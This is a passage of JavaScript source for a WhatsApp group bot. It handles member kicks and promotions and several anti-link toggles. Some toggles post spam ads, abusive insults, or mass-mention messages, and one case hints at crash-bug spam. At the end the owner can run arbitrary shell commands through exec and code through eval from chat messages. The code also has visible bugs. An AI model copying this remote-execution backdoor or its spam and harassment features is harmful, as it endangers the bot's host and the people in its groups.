if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DitzzXploit.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DitzzXploit.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "promote": {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DitzzXploit.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "demote": {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DitzzXploit.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case 'rafathar1':{
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
  DitzzXploit.sendMessage(from, {
    'text': 'HOX WA MU NENTAL'
  }, {
    quoted: lep
  })
  }
break
case 'antivirus': case 'antivirtex': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antivirus) return reply('Sukses Mengaktifikan Tuan✅')
antivirus.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(antivirus))
reply('Success in turning on antivirus in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antivirus) return reply('Sukses Menonaktifkan Tuan✅')
let off = antivirus.indexOf(from)
antivirus.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(antivirus))
reply('Success in turning off antivirus this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkinstagram': case 'antilinkig': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkinstagram) return reply('Sukses Mengaktifikan Tuan✅')
antilinkinstagram.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(antilinkinstagram))
reply('Success in turning on instagram antilink in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkinstagram) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkinstagram.indexOf(from)
antilinkinstagram.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(antilinkinstagram))
reply('Success in turning off instagram antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkfacebook': case 'antilinkfb': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkfacebook) return reply('Sukses Mengaktifikan Tuan✅')
antilinkfacebook.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(antilinkfacebook))
reply('Success in turning on facebook antilink in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkfacebook) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkfacebook.indexOf(from)
antilinkfacebook.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply('Success in turning off facebook antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinktelegram': case 'antilinktg': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinktelegram) return reply('Sukses Mengaktifikan Tuan✅')
antilinktelegram.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(antilinktelegram))
reply('Success in turning on telegram antilink in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinktelegram) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinktelegram.indexOf(from)
antilinktelegram.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(antilinktelegram))
reply('Success in turning off telegram antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinktiktok': case 'antilinktt': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinktiktok) return reply('Sukses Mengaktifikan Tuan✅')
antilinktiktok.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(antilinktiktok))
reply('Success in turning on tiktok antilink in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinktiktok) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinktiktok.indexOf(from)
antilinktiktok.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(antilinktiktok))
reply('Success in turning off tiktok antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinktwitter': case 'antilinktwit': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinktwitter) return reply('Sukses Mengaktifikan Tuan✅')
antilinktwitter.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(antilinktwitter))
reply('Success in turning on twitter antilink in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinktwitter) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinktwitter.indexOf(from)
antilinktwitter.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(antilinktwitter))
reply('Success in turning off twitter antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antiwame': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antiwame) return reply('Sukses Mengaktifikan Tuan✅')
antiwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
reply('Success in turning on antiwame in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://s.id/PediaBotz`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiwame) return reply('Sukses Menonaktifkan Tuan✅')
let off = antiwame.indexOf(from)
antiwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
reply('Success in turning off antiwame in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antipromosi': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antipromosi) return reply('Sukses Mengaktifikan Tuan✅')
antipromosi.push(from)
fs.writeFileSync('./database/antipromosi.json', JSON.stringify(antipromosi))
reply('Success in turning on antipromosi in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK? MATI IBU LU ANJ!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antipromosi) return reply('Sukses Menonaktifkan Tuan✅')
let off = antipromosi.indexOf(from)
antipromosi.splice(off, 1)
fs.writeFileSync('./database/antipromosi.json', JSON.stringify(antipromosi))
reply('Success in turning off antipromosi in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
              case 'antilinkall': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkall) return reply('Sukses Mengaktifikan Tuan✅')
antilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall))
reply('Success in turning on all antilink in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://s.id/PediaBotz`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkall) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkall.indexOf(from)
antilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall))
reply('Success in turning off all antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkytvid': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkytvideo) return reply('Sukses Mengaktifikan Tuan✅')
antilinkytvideo.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(antilinkytvideo))
reply('Success in turning on youtube video antilink in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkytvideo) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkytvideo.indexOf(from)
antilinkytvideo.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(antilinkytvideo))
reply('Success in turning off youtube video antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkytch': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkytchannel) return reply('Sukses Mengaktifikan Tuan✅')
antilinkytchannel.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(antilinkytchannel))
reply('Success in turning on youtube channel antilink in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkytchannel.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(antilinkytchannel))
antilinkytchannel.splice(off, 1)
reply('Success in turning off youtube channel antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'autojpm': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if(!text) return reply(`hahabababb`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
let pukimak = q.split("|")[0]
if (args[0] === "on") {
if (autojpm) return reply('Sukses Mengaktifikan Tuan✅')
autojpm.push(from)
fs.writeFileSync('./database/autojpm.json', JSON.stringify(autojpm))
reply('Success in turning on autojpm in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: pukimak, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!autojpm) return reply('Sukses Menonaktifkan Tuan✅')
let off = autojpm.indexOf(from)
autojpm.splice(off, 1)
fs.writeFileSync('./database/autojpm.json', JSON.stringify(autojpm))
reply('Success in turning off autojpm in this group')
} else {
await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antipannel': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antipanel) return reply('Sukses Mengaktifikan Tuan✅')
antipanel.push(from)
fs.writeFileSync('./database/antipanel.json', JSON.stringify(antipanel))
reply('Success in turning on antipanel in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nwa.me/6283183432282`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antipanel) return reply('Sukses Menonaktifkan Tuan✅')
let off = antipanel.indexOf(from)
antipanel.splice(off, 1)
fs.writeFileSync('./database/antipanel.json', JSON.stringify(antipanel))
reply('Success in turning off antipanel in this group')
} else {
await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkgc': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkgc) return reply('Sukses Mengaktifikan Tuan✅')
antilinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(antilinkgc))
reply('Success in turning on antilinkgc in this group')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.sendMessage(from, {text: `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://s.id/PediaBotz`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkgc) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkgc.indexOf(from)
antilinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(antilinkgc))
reply('Success in turning off antilinkgc in this group')
} else {
await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
default:
}
if (budy.startsWith('$')) {
if (!isOwner) return reply(`CIEE MAU COLONG SC OWNER GW ANJ!! OTW BOT SPAM BUG😎`)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
DitzzXploit.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})